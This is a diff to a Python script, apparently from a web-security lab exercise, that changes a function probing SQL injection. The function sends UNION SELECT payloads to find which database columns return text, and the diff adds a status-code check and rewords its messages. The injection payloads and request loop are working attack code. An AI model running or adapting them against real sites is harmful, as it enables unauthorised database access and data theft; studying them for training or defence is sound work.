@@ -36,9 +36,12 @@ def exploit_sqli_column_text(base_url, num_of_col, payload_entered):
         py = f" UNION select {str_variation}--"
         print(base_url + uri + py)
         r = requests.get(base_url + uri + py, proxies=proxies, verify=False, timeout=5)
+        if r.status_code != 200:
+            print(f"[+] Column {i} is NOT of type text")
+            continue
         payload_matches = r.text.find(payload_entered[1:-1])
         if payload_matches != -1:
-            print(f"[+] Exploit successful, column {i} is of type text")
+            print(f"[+] Column {i} is of type text")
             found += 1
 
     if found:
